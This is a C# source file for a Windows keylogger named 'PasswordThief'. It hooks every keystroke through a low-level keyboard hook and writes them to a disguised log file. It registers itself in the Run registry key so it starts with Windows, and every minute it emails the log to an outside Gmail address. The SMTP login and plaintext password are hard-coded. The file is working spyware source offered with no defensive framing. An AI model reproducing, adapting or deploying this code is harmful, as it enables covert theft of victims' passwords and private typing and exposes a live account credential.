using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using Timer = System.Timers.Timer;
using Microsoft.Win32;

namespace PasswordThief
{
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    class KeyboardThief
    {
        const string appName = "PasswordThief";
        public const string FILEPATH = "C:/temp/";
        const int delayForNewLine = 2;
        const string fileName = "GrandMa_Stories";
        protected const int WH_KEYBOARD_LL = 13;
        public const int KEYEVENTF_EXTENDEDKEY = 0x0001; //Key down flag
        public const int KEYEVENTF_KEYUP = 0x0002;
        public const int WM_KEYDOWN = 0x0100;
        public const int WM_KEYUP = 0x0101;
        protected static IntPtr _hookID = IntPtr.Zero;
        static public string FullPath { get { return FILEPATH + fileName; } }
        private DateTime lastInputTime = DateTime.Now;

        private Timer emailTimer;
        private Timer contentDumpTimer;

        private readonly StringBuilder contentBuilder = new StringBuilder();

        private static ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();
        private static object syncroot = new object();
        private bool isSendingEmail = false;


        public void Start()
        {
            AddToStartUp();
            _hookID = SetHook(HookCallback);

            emailTimer = new System.Timers.Timer(1 * 60 * 1000);
            emailTimer.Elapsed += EmailTimer_Elapsed;
            emailTimer.Start();

            contentDumpTimer = new System.Timers.Timer(1000);
            contentDumpTimer.Elapsed += ContentDumpTimer_Elapsed;
            contentDumpTimer.Start();
        }


        public void Finish()
        {
            UnhookWindowsHookEx(_hookID);
            emailTimer.Stop();
            contentDumpTimer.Stop();
        }

        public void EmailTimer_Elapsed(object sender, EventArgs e)
        {
            SendEmail();
        }

        public void ContentDumpTimer_Elapsed(object sender, EventArgs e)
        {
            if (isSendingEmail) return;
           
            lock (contentBuilder)
            {
                WriteStringToFile(contentBuilder.ToString());
                contentBuilder.Clear();
            }
        }


        public void AddToStartUp()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);


            rk.SetValue(appName, Application.ExecutablePath.ToString());
        }

        public void RemoveFromStartUp()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);


            rk.DeleteValue(appName, false);
        }


        public void SendEmail()
        {
            isSendingEmail = true;
            try
            {

                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("report.notification.passthief@gmail.com");
                mail.To.Add("katjareznikova@gmail.com");
                mail.Subject = "PasswordThief_Report";
                mail.Body = "Mail with attachment";

                Attachment attachment;

                attachment = new Attachment(FullPath);
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new NetworkCredential("report.notification.passthief@gmail.com", "Kaliningrad124");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                isSendingEmail = false;
                attachment.ContentStream.Close();
            }

            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                isSendingEmail = false;
            }

        }

        public void WriteStringToFile(string str)
        {
            _readWriteLock.EnterWriteLock();
            try
            {
                string stringLine = string.Format("{0}", str);
                File.AppendAllText(FullPath, stringLine);
            }
            catch (Exception e)
            {

            }
            finally
            {
                // Release lock
                _readWriteLock.ExitWriteLock();
            }

        }


        public virtual IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode == 0 && wParam == (IntPtr)WM_KEYDOWN)
            {

                int vkCode = Marshal.ReadInt32(lParam);
                string output = Convert.ToString((Keys)vkCode);
                TimeSpan diff = DateTime.Now - lastInputTime;
                if (diff.TotalSeconds > delayForNewLine)
                {
                    contentBuilder.Append(Environment.NewLine);
                    //WriteStringToFile(Environment.NewLine);
                }
                //WriteStringToFile(output);
                Debug.WriteLine(output);
                contentBuilder.AppendFormat("{0} ", output);

                lastInputTime = DateTime.Now;

                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                        GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);


    }
}
